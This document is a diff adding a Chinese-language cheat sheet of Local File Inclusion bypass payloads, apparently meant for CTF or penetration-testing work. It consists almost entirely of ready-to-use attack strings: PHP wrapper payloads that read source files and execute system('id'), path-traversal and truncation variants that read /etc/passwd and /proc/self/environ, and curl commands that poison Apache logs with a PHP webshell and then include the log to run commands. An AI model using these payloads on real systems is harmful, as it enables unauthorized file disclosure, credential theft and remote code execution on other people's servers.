@@ -1,0 +1,73 @@
+# LFI 绕过技巧
+
+> Local File Inclusion — 本地文件包含绕过
+
+## 常用 Wrapper
+```php
+# PHP 伪协议
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-7/resource=config.php
+
+# 利用 php://filter 链（多级编码）
+php://filter/convert.base64-encode|convert.base64-encode/resource=flag.php
+
+# data:// 执行代码（需要 allow_url_include=On）
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
+data://text/plain,<?php system('id');?>
+
+# input:// 执行代码
+POST: <?php system('id');?>
+```
+
+## 路径遍历
+```php
+../../../etc/passwd
+....//....//....//etc/passwd
+..\..\..\..\etc\passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd  (二次编码)
+....//....//....//....//etc/passwd            (双斜杠)
+```
+
+## 后缀名限制绕过
+```php
+# %00 截断（PHP < 5.3.4）
+../../../etc/passwd%00
+
+# 长路径截断（PHP < 5.2.x）
+../../../etc/passwd/././././././././.[超过4096字符]
+
+# 利用日志文件包含（已上传 webshell 到 access log）
+../../../var/log/apache2/access.log
+
+# 利用 /proc/self/environ
+../../../proc/self/environ
+
+# 利用 php://filter + base64
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+
+# 利用 /var/log/nginx/error.log
+../../../var/log/nginx/error.log
+```
+
+## 文件包含读源码
+```php
+# 包含 PHP 文件时用 filter base64 读取源码
+php://filter/convert.base64-encode/resource=config.php
+
+# 多文件拼接
+php://filter/convert.base64-encode/resource=config.php|convert.base64-encode/resource=flag.php
+```
+
+## 写入 Webshell（通过日志注入）
+```bash
+# 1. 向 Apache 日志注入 PHP 代码
+curl "http://target.com/<?php system(\$_GET['cmd']); ?>"
+
+# 2. 包含日志文件
+curl "http://target.com/index.php?file=../../../var/log/apache2/access.log&cmd=id"
+
+# 3. 利用 /proc/self/fd/ 遍历
+../../../proc/self/fd/X   # X 从 1 遍历到 50
+```
